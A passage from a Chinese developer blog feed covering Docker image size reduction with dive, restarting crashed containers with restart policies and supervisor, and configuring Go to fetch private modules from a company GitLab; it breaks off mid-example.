<p>这个属性是一个数组，可以填入多个镜像仓库地址。修改完成之后，使用命令 <code>service docker restart</code> 重启守护进行即可。</p>
<p>如果是在 Docker Desktop 中，则点击设置按钮，定位到 <strong>Docker Engine</strong> 选项卡，就可以看到 <code>registry-mirrors</code> 的属性配置了。修改完成后点击 <strong>Apply &amp; Restart</strong> 重启即可。</p>
<p><img src="/images/image-20211026145858747.png" alt="image-20211026145858747"></p>
<p><strong>图 2.2.1</strong></p>
<h3 id="2-3-生成的镜像个头大"><a href="#2-3-生成的镜像个头大" class="headerlink" title="2.3 生成的镜像个头大"></a>2.3 生成的镜像个头大</h3><p>有的时候，明明你感觉 dockerfile 中做的操作很少，生成的镜像却出其意料的大，那么你就需要一款对于 dockerfile 中指令进行分析的工具。</p>
<p>dockerfile 中首先会指定一个基础镜像（通过 FROM 指令指定），接着后面代码中每一个新指令都会在前面指令的基础上叠加一层，产生一个新的临时镜像，直到 dockerfile 中所有指令执行完成，得到一个新的完整的镜像。</p>
<p>考虑下面一个 dockerfile</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM centos:7 as base

# 更改 yum 源
RUN mv &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo.backup
COPY docker&#x2F;etc&#x2F;yum.repos.d &#x2F;etc&#x2F;yum.repos.d
RUN sed -i -e &#39;&#x2F;plugins&#x3D;1&#x2F;d&#39; -e &#39;&#x2F;plugins&#x3D;0&#x2F;d&#39; &#x2F;etc&#x2F;yum.conf

RUN yum install epel-release -y 
RUN yum install wget curl make tcpdump net-tools bind-utils telnet \
    logrotate ca-certificates which crontabs -y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 2.3.1 first.Dockerfile</strong></p>
<p>我们想自己制作一个 centos 的基础镜像，以后在制作其他应用的镜像的时候，可以拿这个镜像做基础镜像。我们的需求也很简单，增加一些常用的依赖包即可。</p>
<p>通过 <code>docker build . -f first.Dockerfile --progress=plain --no-cache -t first-centos</code> 来构建，运行完之后通过 <code>docker images first-centos</code>查看镜像体积，通过输出发现镜像有五百多 MB</p>
<pre class="line-numbers language-none"><code class="language-none">REPOSITORY     TAG       IMAGE ID       CREATED          SIZE
first-centos   latest    af7fadc07b7a   15 minutes ago   523MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>但是我们查看 centos 的镜像大小 <code>docker images centos:7</code>：</p>
<pre class="line-numbers language-none"><code class="language-none">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
centos       7         eeb6ee3f44bd   5 weeks ago   204MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>原始的镜像只有两百多 MB，那么到底是哪行命令导致的呢？这个时候，你可以使用 <a href="https://github.com/wagoodman/dive">dive</a> 这个工具。将其安装完成之后直接用 dive first-centos 命令即可查看 first-centos 这个镜像中对应的 dockerfile 中每行指令所产生的“层”的大小。</p>
<blockquote>
<p>官方提供的使用 go get 安装的模式，经过笔者测试在 go 1.16+ 下无法运行(可以参见 <a href="https://github.com/wagoodman/dive/issues/371">issue 371</a>)。Windows 中安装二进制文件后，在命令行中排版有问题。推荐使用 Ubuntu 安装 deb 包的模式进行安装。</p>
</blockquote>
<p>使用 <code>dive first-centos</code> 来查看各个层的文件变动，加载完界面后，按 <code>Tab</code> 键激活左右命令行区域，切换到右侧区域后，按 <code>CTRL+U</code>键可以过滤掉未修改的文件，只显示被修改的文件。然后再通过 <code>Tab</code> 键回到左侧区域，通过方向键切换查看各个指令，对应右侧区域会显示镜像内有哪些文件被更改。</p>
<p><img src="/images/dive-first.gif" alt="查看 first-centos 的各层空间占用"></p>
<p><strong>图 2.3.1 查看 first-centos 的各层空间占用</strong></p>
<p>可以看到最后两个 yum 命令，会在 &#x2F;var&#x2F;cache 中生成大量缓存文件，是导致我们镜像内容变动的原因。yum 的在运行 install 命令时，会检测包元数据的缓存数据是否存在，如果不存在就会重新生成。所以我们在查看 yum install 命令的级联文件变动的时候，会在 &#x2F;var&#x2F;cache 下显示如此大的磁盘新增量。</p>
<p>接着我们修改一下 <strong>代码 2.3.1</strong> ,增加缓存清理机制：</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM centos:7 as base

# 更改 yum 源
RUN mv &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo.backup
COPY docker&#x2F;etc&#x2F;yum.repos.d &#x2F;etc&#x2F;yum.repos.d
RUN sed -i -e &#39;&#x2F;plugins&#x3D;1&#x2F;d&#39; -e &#39;&#x2F;plugins&#x3D;0&#x2F;d&#39; &#x2F;etc&#x2F;yum.conf

RUN yum install epel-release -y &amp;&amp; yum clean all &amp;&amp; rm -rf &#x2F;var&#x2F;cache&#x2F;yum
RUN yum install wget curl make tcpdump net-tools bind-utils telnet \
    logrotate ca-certificates which crontabs -y &amp;&amp; yum clean all &amp;&amp; rm -rf &#x2F;var&#x2F;cache&#x2F;yum<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 2.3.2 second.Dockerfile</strong></p>
<p>使用命令 <code>docker build . -f second.Dockerfile --progress=plain  -t second-centos</code> 构建完成之后，再用命令 <code>dive second-centos</code> 查看，可以发现各个层的文件大小正常了：</p>
<p><img src="/images/image-20211027162450032.png" alt="image-20211027162450032"> </p>
<p><strong>图 2.3.2</strong></p>
]]></content>
      <categories>
        <category>Cloud Native</category>
        <category>Docker</category>
      </categories>
  </entry>
  <entry>
    <title>docker 容器的优雅重启方案</title>
    <url>/posts/gracefully-restart-on-docker/</url>
    <content><![CDATA[<p>当我们将编写的程序部署到服务器之后，免不了会面临未知 bug 导致的程序崩溃退出问题，这个时候快速的将程序进行重启，显得尤为重要，特别是那种在后端和用户之间维持会话的服务。这篇文章就是讲一下，如果你的程序部署到 docker 后，如何做到优雅重启。</p>
<h2 id="1-自带解决方案"><a href="#1-自带解决方案" class="headerlink" title="1. 自带解决方案"></a>1. 自带解决方案</h2><p>docker 本身在启动的时候，会可以加参数做到容器崩溃后自动重启的，在 <code>docker run</code> 的时候增加 <code>--restart always</code> 即可。但是并不是在所有情况下，docker 的重启策略都会生效，官方还给出了以下几点要求</p>
<p>重启只能是在容器启动成功后才能生效，并且给出了容器启动成功的指标，那就是容器起码正常启动 10s，在这期间没有发生退出。</p>
<p>如果你手动使用 <code>docker stop</code> 命令关闭了容器，那么重启策略也会失效。</p>
<p>还有一点是跟 docker swarm 相关的，由于这个组件现在用的比较少，这里略过。</p>
<p>下面是一个例子用来演示在给定的时间后异常退出当前进程。</p>
<blockquote>
<p>当前例子的代码都可以从<a href="https://gitlab.com/yunnysunny/docker-start/-/tree/main/start_always">这里</a>找到</p>
</blockquote>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"os"</span>
	<span class="token string">"strconv"</span>
	<span class="token string">"time"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"begin"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Format</span><span class="token punctuation">(</span><span class="token string">"2006-01-02 15:04:05"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	seconds <span class="token operator">:=</span> <span class="token number">11</span>
	<span class="token keyword">if</span> <span class="token builtin">len</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>Args<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">&#123;</span>
		secondsFromCli<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
		<span class="token keyword">if</span> secondsFromCli <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
			seconds <span class="token operator">=</span> secondsFromCli
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Duration</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"exit"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Format</span><span class="token punctuation">(</span><span class="token string">"2006-01-02 15:04:05"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	os<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.1 delay_exit.go</strong></p>
<p>我们制作一个 <a href="https://gitlab.com/yunnysunny/docker-start/-/blob/main/start_always/start_always.Dockerfile">dockerfile</a> (详细代码参见<a href="https://gitlab.com/yunnysunny/docker-start/-/blob/main/start_always/start_always.Dockerfile">链接</a>)，指定 entrypoint 脚本内容如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#!&#x2F;bin&#x2F;bash

date
&#x2F;opt&#x2F;delay-exit &quot;$@&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.2 start.sh</strong></p>
<p>将 <strong>代码 1.1</strong> 构建，生成可执行文件，放置于 &#x2F;opt&#x2F;delay-exit 。我们在 docker run 的时候可以指定任意一个进程退出的等待时间，如果不指定则 11s 后退出。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#!&#x2F;bin&#x2F;bash

source .&#x2F;common.sh
docker run --restart always --name always-test $TAG_LATEST &quot;$@&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.3 test_always.sh</strong></p>
<p><strong>代码 1.3</strong> 是我们准备好的测试文件，其中 <code>$TAG_LATEST</code> 是制作好的，含有 delay_exit.go 的编译生成可执行程序的镜像。</p>
<p>首先看正常 11s 退出的情况，<code>./test_always.sh</code> 即可启动容器，然后通过 <code>docker logs always-test</code> 来看启动容器的运行日志：</p>
<pre class="line-numbers language-none"><code class="language-none">Tue Oct 12 16:20:24 CST 2021
begin 2021-10-12 16:20:24
exit 2021-10-12 16:20:35
Tue Oct 12 16:20:35 CST 2021
begin 2021-10-12 16:20:35
exit 2021-10-12 16:20:46
Tue Oct 12 16:20:47 CST 2021
begin 2021-10-12 16:20:47
exit 2021-10-12 16:20:58
Tue Oct 12 16:20:59 CST 2021
begin 2021-10-12 16:20:59
exit 2021-10-12 16:21:10
Tue Oct 12 16:21:10 CST 2021
begin 2021-10-12 16:21:10
exit 2021-10-12 16:21:21
Tue Oct 12 16:21:22 CST 2021
begin 2021-10-12 16:21:22
exit 2021-10-12 16:21:33
Tue Oct 12 16:21:33 CST 2021
begin 2021-10-12 16:21:33
exit 2021-10-12 16:21:44
Tue Oct 12 16:21:45 CST 2021
begin 2021-10-12 16:21:45
exit 2021-10-12 16:21:56
Tue Oct 12 16:21:56 CST 2021
begin 2021-10-12 16:21:56
exit 2021-10-12 16:22:07
Tue Oct 12 16:22:08 CST 2021<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exit 语句下面是 &#x2F;start.sh 脚本中 <code>date</code> 命令的输出内容，可以看到容器退出到重启在 1s 之内完成，说明还是挺高效的。</p>
<p>使用 <code>docker stop always-test &amp;&amp; docker rm always-test</code>，删除当前容器，重新启动，这次增加一个启动参数 <code>./test_always.sh 2</code>，即更改默认退出等待时间为 2s 。再次查看容器日志：</p>
<pre class="line-numbers language-none"><code class="language-none">Tue Oct 12 16:16:14 CST 2021
begin 2021-10-12 16:16:14
exit 2021-10-12 16:16:16
Tue Oct 12 16:16:16 CST 2021
begin 2021-10-12 16:16:16
exit 2021-10-12 16:16:18
Tue Oct 12 16:16:19 CST 2021
begin 2021-10-12 16:16:19
exit 2021-10-12 16:16:21
Tue Oct 12 16:16:21 CST 2021
begin 2021-10-12 16:16:21
exit 2021-10-12 16:16:23 #从这一次开始重启等待时间被拉长
Tue Oct 12 16:16:25 CST 2021
begin 2021-10-12 16:16:25
exit 2021-10-12 16:16:27
Tue Oct 12 16:16:29 CST 2021
begin 2021-10-12 16:16:29
exit 2021-10-12 16:16:31
Tue Oct 12 16:16:34 CST 2021
begin 2021-10-12 16:16:34
exit 2021-10-12 16:16:36
Tue Oct 12 16:16:43 CST 2021<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>会发现启动时间不足 10s，docker 不会立即重启退出的容器，随着重启次数增多，会逐渐拉长启动时间。</p>
<h2 id="2-宿主机守护进程"><a href="#2-宿主机守护进程" class="headerlink" title="2. 宿主机守护进程"></a>2. 宿主机守护进程</h2><p>docker 容器启动时，会在启动 docker 容器的宿主机上产生一个进程，如果 docker 容器异常退出，这个进程也会退出，所以我们也可以在宿主机上使用 <a href="https://freedesktop.org/wiki/Software/systemd/">systemd</a> <a href="http://upstart.ubuntu.com/">upstart</a> <a href="http://supervisord.org/">supervisor</a> 等工具通过监听进程状态来达到重启目的，但是从使用便捷性上来说不如直接使用 <code>docker run</code> 的 <code>--restart always</code> 参数。</p>
<h2 id="3-容器内部守护进程"><a href="#3-容器内部守护进程" class="headerlink" title="3. 容器内部守护进程"></a>3. 容器内部守护进程</h2><p>还有最后一个途径，就是直接将进程重启监听放置到 docker 容器内部，这个做法官方是不推荐的，因为这样子 docker 守护进程本身无法感知到应用的运行状态。但是考虑到这种情况，为了保障服务的高可用性，我们一般会配合使用日志收集、异常启动报警、性能指标采集、服务发现等组件。如果你使用 <a href="https://kubernetes.io/">Kubernetes</a> 这种容器编排系统的时候，可以把上述组件每个组成单独的容器，然后和应用容器共享同一个 pod 的模式来进行统一管理。但是目前很多中小型公司，并没有在使用 Kubernetes；再考虑一种更复杂的情况，有一些公司的部署结构是混合的，一部分位于 Kubernetes 集群中，另一部分运行在老旧的、不支持编排的容器系统中，但是出于通用性和可维护性的考量，又不想引入太多异构的部署模型。这些上述描述情况，看上去最合适的解决方案就是将这些组件也内置到容器内部，那么使用容器内部的进程重启监控程序，就显得更加适合。这里我们选择使用 supervisor，因为这个程序是在 docker 中安装方便，只需要有 python 即可，如果使用 systemd 的话，需要 docker 开启特殊权限，并且有一些公司的运维出于安全考虑还会禁用掉特权模式。</p>
<p>首先是构建 supervisor 的基础镜像</p>
<blockquote>
<p>本小节中的代码都能从<a href="">这里</a>找到源代码</p>
</blockquote>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM centos:7 as base

# 更改 yum 源
RUN mv &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo.backup
COPY docker&#x2F;etc&#x2F;yum.repos.d &#x2F;etc&#x2F;yum.repos.d
RUN sed -i -e &#39;&#x2F;plugins&#x3D;1&#x2F;d&#39; -e &#39;&#x2F;plugins&#x3D;0&#x2F;d&#39; &#x2F;etc&#x2F;yum.conf
RUN yum clean all

RUN yum install epel-release -y
RUN yum install wget curl make tcpdump net-tools bind-utils telnet python3 python3-pip logrotate ca-certificates which crontabs -y

# 安装 supervisor
COPY docker&#x2F;root&#x2F;.pip &#x2F;root&#x2F;.pip
RUN pip3 install supervisor
RUN mkdir -p &#x2F;data&#x2F;supervisor&#x2F;log
COPY docker&#x2F;etc&#x2F;supervisord.conf &#x2F;etc
COPY docker&#x2F;etc&#x2F;supervisor.d &#x2F;etc&#x2F;supervisor.d
# 配置 logrotate
COPY docker&#x2F;etc&#x2F;logrotate.d &#x2F;etc&#x2F;logrotate.d

# 使用东八区时区
RUN ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime
# 必须添加这两个环境变量，否则 supervisor 无法在 python3 下启动
ENV LC_ALL &quot;en_US.UTF-8&quot;
ENV LANG &quot;en_US.UTF-8&quot;

# 添加启动脚本
COPY docker&#x2F;app_init.sh &#x2F;
COPY docker&#x2F;app.init.d  &#x2F;app.init.d
COPY docker&#x2F;entrypoint.sh &#x2F;
ENTRYPOINT [ &quot;&#x2F;entrypoint.sh&quot; ]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 3.1</strong></p>
<p>supervisor 是一个 python 2.7 编写的工具，由于 python 2.7 已经处在停止维护阶段，这里选择安装了 python 3。但是发现如果不设置 <code>LC_ALL</code> <code>LANG</code> 这两个环境变量的话，会报错：</p>
<pre class="line-numbers language-none"><code class="language-none">Error: &#39;ascii&#39; codec can&#39;t decode byte<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>所以在 <strong>代码 3.1</strong> 中专门设置了这两个环境变量。</p>
<p>接着看入口文件 entrypoint.sh:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

/app_init.sh

<span class="token string">"<span class="token variable">$@</span>"</span>
<span class="token comment"># 前台 启动 supervisor 的守护进程 supervisord</span>
<span class="token builtin class-name">exec</span> supervisord -c /etc/supervisord.conf -n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 3.2 entrypoint.sh</strong></p>
<p>首先看最后一行 exec 的用法。我们使用 supervisor 作为守护进程，也就是说对于使用这个镜像的容器来说，它所运行的应用是 supervisor，那么在 supervisor 异常退出之后，当前容器是不可用的，也就是说我们应该让 docker 感知到当前 supervisor 是否可用。docker 感知容器是否正常的方式，就是容器内部 pid 为 1 的进程是否退出，这个 pid 为 1 的进程，就是通过 ENTRYPOINT （如果没有 ENTRYPOINT 的话，是CMD ）指令指定的程序运行后产生的。显然这里我们要做的是要将 supervisord 的运行进程 ID 置为 1。如果我们在 entrypoint.sh 脚本中运行 supervisord 时没有使用 exec 的话，进程 ID 为 1 的进程，将是 entrypoint.sh ，而使用 exec 后，entrypoint.sh 进程将会被 supervisord 替代，也就是说 supervisord 就会成为 1 号进程。最终也就实现了 supervisord 进程退出能被 docker 感知到的目的。</p>
<p>我们将所有通过 supervisor 收录的应用的配置文件统一放置在目录 &#x2F;etc&#x2F;supervisor.d 中，在我们的镜像中安装了 crontabs ，并通过 supervisor 对其守护，下面是它的配置文件：</p>
<pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token comment"># crond 为项目名，可以根据实际情况制定</span>
<span class="token header"><span class="token punctuation">[</span><span class="token section-name selector">program:crond</span><span class="token punctuation">]</span></span>
<span class="token comment">#脚本目录</span>
<span class="token key attr-name">directory</span><span class="token punctuation">=</span><span class="token value attr-value">/usr/sbin</span>
<span class="token comment">#脚本执行命令</span>
<span class="token key attr-name">command</span><span class="token punctuation">=</span><span class="token value attr-value">/usr/sbin/crond -n</span>

<span class="token comment">#supervisor启动的时候是否随着同时启动，默认true</span>
<span class="token key attr-name">autostart</span><span class="token punctuation">=</span><span class="token value attr-value">true</span>
<span class="token comment">#当程序exit的时候，这个program不会自动重启,默认unexpected，设置子进程挂掉后自动重启的情况，有三个选项，false,unexpected和true。如果为false的时候，无论什么情况下，都不会被重新启动，如果为unexpected，只有当进程的退出码不在下面的exitcodes里面定义的</span>
<span class="token key attr-name">autorestart</span><span class="token punctuation">=</span><span class="token value attr-value">true</span>
<span class="token comment">#这个选项是子进程启动多少秒之后，此时状态如果是running，则我们认为启动成功了。默认值为1</span>
<span class="token key attr-name">startsecs</span><span class="token punctuation">=</span><span class="token value attr-value">1</span>

<span class="token comment">#设置日志输出 </span>
<span class="token key attr-name">stdout_logfile</span><span class="token punctuation">=</span><span class="token value attr-value">/data/supervisor/log/crond.log</span> 
<span class="token key attr-name">stderr_logfile</span><span class="token punctuation">=</span><span class="token value attr-value">/data/supervisor/log/crond.log</span> 
<span class="token comment">#把stderr重定向到stdout，默认 false</span>
<span class="token comment"># redirect_stderr = false</span>
<span class="token comment">#stdout日志文件大小，由于我们配置了 logrotate 进行日志拆分，所以这里设置为 0</span>
<span class="token key attr-name">stdout_logfile_maxbytes</span> <span class="token punctuation">=</span> <span class="token value attr-value">0</span>
<span class="token comment">#stdout日志文件备份数</span>
<span class="token key attr-name">stdout_logfile_backups</span> <span class="token punctuation">=</span> <span class="token value attr-value">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 3.3 crontab.ini</strong></p>
<p>首先要留意 command 属性，我们在启动 crond 程序的时候添加了 <code>-n</code> 参数，这代表 crond 要在前台运行，也就是说如果你手动在命令行中运行 <code>crond -n</code> 时，当前命令行不退出，必须手动执行 CTRL + C 才能退出当前程序。supervisor 是应用级别的守护进程，跟 systemd 这种系统级别的守护进程还是有区别的，后者启动程序后在后台运行也能识别出来运行状态，但是 supervisor 如果启动程序在后台运行，它是识别不出来运行的程序是哪个的，这也导致你的应用必须得在前台运行。具体到 <strong>代码 3.3</strong>，我们给 crond 的启动加 <code>-n</code> 参数，就是这个原因。再举一个例子，如果你用 supervisor 启动 nginx 的话，也需要指定参数 <code>-g &quot;daemon off;&quot;</code> 让其在前台启动，否则你就会发现 supervisor 会报 nginx 启动失败。</p>
<p>接着就是日志配置，supervisor 默认支持日志拆分功能，这里我们将其禁用掉（<code>stdout_logfile_maxbytes</code> 和 <code>stdout_logfile_backups</code> 都设置为零），因为我们在系统中添加了 logrotate，我们将日志切分工作交给了 logrotate 来处理。</p>
<p>最终如果你开发了一个新的应用做部署的时候，可以基于这个 supervisor 镜像来制作一个子镜像，然后将配置文件放置到 &#x2F;etc&#x2F;supervisor.d 目录下即可。如果感觉编译麻烦也可以直接用笔者制作好的镜像：registry.cn-hangzhou.aliyuncs.com&#x2F;whyun&#x2F;base:supervisor-latest。</p>
]]></content>
      <categories>
        <category>Cloud Native</category>
        <category>Docker</category>
      </categories>
  </entry>
  <entry>
    <title>go 私有化包构建路</title>
    <url>/posts/go-private-package/</url>
    <content><![CDATA[<p>一般学习一门新的编程语言的时候，都要顺便学习一下它的包管理知识。go 语言起步的时候，包管理还比较粗糙，从 1.11 版本开始逐步引入 GO Module 机制，通过设置环境 <code>GO111MODULE=on</code> 来开启其支持，从 1.16 开始这个环境变量默认为 <code>on</code>。如果不确定可以通过 <code>go env | grep GO111MODULE</code> 来查看下。</p>
<p>按理来说通过 go get 就能下载托管在 github 上的包，但是很多时候，我们想将自己的某一部分代码抽离出来做成一个包，但是这部分代码又不能公开，最适合就是托管到公司代码仓库上去，比如说 gitlab。那么从私有镜像仓库下载 go 包，就成为一个特别紧迫的需求。</p>
<h2 id="1-git-配置"><a href="#1-git-配置" class="headerlink" title="1. git 配置"></a>1. git 配置</h2><p>其实 go 官方是支持这种功能的。假设你公司的 gitlab 域名为 gitlab.your-company.com ，首先我们要设置环境变量 <code>GOPRIVATE</code>，通过命令 </p>
<p> <code>go env -w GOPRIVATE=gitlab.your-company.com</code> </p>
<p><strong>代码 1.0</strong></p>
<p>即可设置完成。然后就是配置 git 授权，让 go 能够正确的从 git 仓库中下载源代码。go 默认使用 https 协议来跟 git 服务器通信，所以通过再 .netrc 文件（此文件在 HOME 目录下，Linux 下在 $HOME 中，Windows 下在 %USERPROFILE% 中）中增加如下配置，可以让 go 可以跟 git 服务正确的通信。</p>
<pre class="line-numbers language-none"><code class="language-none">machine gitlab.your-company.com
login 你内网 gitlab 的用户名
password 你内网 gitlab 的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><strong>代码 1.1</strong></p>
<p>然后大家 git 的惯用用法是使用 ssh 模式跟 git 服务器通信。所以单独配置一个 https 的访问模式显得不伦不类，可以使用 git 自带的 url 替换配置，强制让 go 在跟 git 服务器端通信的时候，修改 .gitconfig 文件（此文件在用户根目录下，Linux 下在 $HOME 中，Windows 下在 %USERPROFILE% 中）就能达到这种目的。</p>
<pre class="line-numbers language-none"><code class="language-none">[url &quot;git@gitlab.your-company.com:&quot;]
    insteadOf &#x3D; https:&#x2F;&#x2F;gitlab.your-company.com&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>代码 1.2</strong></p>
<p>如果你的 git 服务器使用的端口号并不是标准的 22 端口，你可能对于上述配置比较疑惑，为何配置中不需要加端口号呢，其实一个默认的 ssh 格式的 git 链接是这种格式的 <a href="mailto:&#x67;&#105;&#x74;&#x40;&#x67;&#x69;&#116;&#x68;&#117;&#98;&#x2e;&#99;&#x6f;&#x6d;">&#x67;&#105;&#x74;&#x40;&#x67;&#x69;&#116;&#x68;&#117;&#98;&#x2e;&#99;&#x6f;&#x6d;</a>:yunnysunny&#x2F;nodebook.git 这里拿 github 上的一个项目举例，其中 yunnysunny 为账号，nodebook 为项目名。假设 git 没有开启默认的端口 22 作为 ssh 访问端口，而是使用 1234 的话，我们的 ssh 地址应该是这样子：<a href="mailto:&#x67;&#105;&#116;&#64;&#103;&#x69;&#116;&#104;&#117;&#x62;&#46;&#99;&#111;&#109;">&#x67;&#105;&#116;&#64;&#103;&#x69;&#116;&#104;&#117;&#x62;&#46;&#99;&#111;&#109;</a>:1234&#x2F;yunnysunny&#x2F;nodebook.git，也就是说  <a href="mailto:&#103;&#105;&#x74;&#x40;&#103;&#105;&#x74;&#x68;&#117;&#x62;&#46;&#x63;&#111;&#109;">&#103;&#105;&#x74;&#x40;&#103;&#105;&#x74;&#x68;&#117;&#x62;&#46;&#x63;&#111;&#109;</a>: 是固定格式，那端口号的配置从哪里获取呢，答案是 .ssh 目录（此目录在 Linux 下在 $HOME 中，Windows 下在 %USERPROFILE% 中）下的 config 文件，如果你的 git 服务开启的是 1234 的，应该会有如下配置</p>
<pre class="line-numbers language-none"><code class="language-none">Host gitlab.your-company.com
  Hostname gitlab.your-company.com
  User 你内网 gitlab 的用户名
  IdentityFile ~&#x2F;.ssh&#x2F;私钥文件
  Port 1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.3</strong></p>
<p>git 程序最终在 config 这个文件中读取的端口号，你也可以通过 <code>ssh -vT gitlab.your-company.com</code> 来手动验证这个过程，不出意外的话，最终会有如下输出：</p>
<pre class="line-numbers language-none"><code class="language-none">Welcome to GitLab, @你内网 gitlab 的用户名!
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
debug1: channel 0: free: client-session, nchannels 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="2-编写模块"><a href="#2-编写模块" class="headerlink" title="2. 编写模块"></a>2. 编写模块</h2><p>在内网 gitlab 上你的账号域下创建一个 mod-test 的项目，然后我们就得到了这么一个项目 <a href="http://gitlab.your-company.com/your-account/mod-test">http://gitlab.your-company.com/your-account/mod-test</a> 其中 your-account 为你的内网 gitlab 账号名。</p>
<p>接着在本地任意目录中执行</p>
<pre class="line-numbers language-none"><code class="language-none">git clone ssh:&#x2F;&#x2F;git@gitlab.your-company.com:your-account&#x2F;mod-test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后进入文件夹 mod-test，执行 </p>
<pre class="line-numbers language-none"><code class="language-none">go mod init  gitlab.your-company.com&#x2F;your-account&#x2F;mod-test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其中 your-account 为你的本地 gitlab 账号</p>
<p>接下来就是写一个测试模块</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"fmt"</span>
<span class="token punctuation">)</span>
